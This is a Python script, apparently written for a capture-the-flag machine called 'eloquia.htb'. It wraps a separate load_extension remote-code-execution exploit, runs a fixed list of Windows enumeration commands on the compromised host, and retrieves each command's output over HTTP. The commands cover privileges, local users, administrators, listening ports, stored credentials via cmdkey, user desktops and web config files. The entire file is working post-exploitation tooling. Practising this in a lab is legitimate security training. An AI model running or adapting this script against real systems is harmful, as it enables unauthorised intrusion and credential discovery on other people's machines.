#!/usr/bin/env python3
"""Compact Windows enumeration via load_extension RCE - forces new DLL per command"""
import subprocess, sys, re, requests

CMDS = [
    ("USER", "whoami /priv"),
    ("USERS", "net user"),
    ("ADMINS", "net localgroup administrators"),
    ("NETSTAT", "netstat -ano | findstr LISTEN"),
    ("CREDS", "cmdkey /list"),
    ("DIRS", "dir C:\\Users /b"),
    ("DESKTOP", "dir C:\\Users\\Administrator\\Desktop"),
    ("WEB", "dir C:\\Web /s /b | findstr /i \".py .ps1 .config\""),
]

def run(label, cmd):
    print(f"\n{'='*60}\n[{label}] {cmd}\n{'='*60}")
    try:
        r = subprocess.run(
            ["python3", "load_extension_rce.py", "--file-cmd", cmd, "--force"],
            capture_output=True, text=True, timeout=120
        )
        out = r.stdout + r.stderr
        # Extract output URL and fetch content
        match = re.search(r'(http://[^\s]+output_[^\s]+\.txt)', out)
        if match:
            resp = requests.get(match.group(1), timeout=10)
            print(resp.text.strip()[:2000])
        elif "Output file found" in out:
            # Try to find in "fetching" lines
            for line in out.split('\n'):
                if 'eloquia.htb/static/output' in line:
                    url = 'http://eloquia.htb/static/' + line.split('static/')[-1].split()[0]
                    resp = requests.get(url, timeout=10)
                    print(resp.text.strip()[:2000])
                    break
        else:
            print("FAILED - check load_extension_rce.py manually")
            print(out[-500:])
    except Exception as e:
        print(f"ERR: {e}")

if __name__ == "__main__":
    if len(sys.argv) > 1:
        run("CMD", ' '.join(sys.argv[1:]))
    else:
        for label, cmd in CMDS:
            run(label, cmd)
